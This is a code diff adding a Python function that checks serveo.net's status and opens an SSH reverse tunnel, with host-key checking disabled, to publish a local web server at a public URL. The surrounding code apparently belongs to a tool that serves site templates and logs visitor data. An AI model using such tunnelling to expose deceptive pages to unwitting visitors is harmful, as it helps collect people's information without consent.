@@ -118,3 +118,50 @@ def template_select():
 
 	info = 'template/{}/php/info.txt'.format(site)
 	result = 'template/{}/php/result.txt'.format(site)
+
+def serveo():
+	global subdom
+	flag = False
+
+	print(G + '[+]' + C + ' Checking Serveo Status...', end='')
+
+	try:
+		time.sleep(1)
+		rqst = requests.get('https://serveo.net', timeout=5)
+		sc = rqst.status_code
+		if sc == 200:
+			print(C + '[' + G + ' Online ' + C + ']' + W + '\n')
+		else:
+			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
+			exit()
+	except requests.ConnectionError:
+		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
+		exit()
+			
+	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
+	if subdom is None:
+		with open('logs/serveo.txt', 'w') as tmpfile:
+			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+	else:
+		with open('logs/serveo.txt', 'w') as tmpfile:
+			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
+	
+	while True:
+		with open('logs/serveo.txt', 'r') as tmpfile:
+			try:
+				stdout = tmpfile.readlines()
+				if flag == False:
+					for elem in stdout:
+						if 'HTTP' in elem:
+							elem = elem.split(' ')
+							url = elem[4].strip()
+							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
+							flag = True
+						else:
+							pass
+				elif flag == True:
+					break
+			except Exception as e:
+				print(e)
+				pass
+		time.sleep(2)
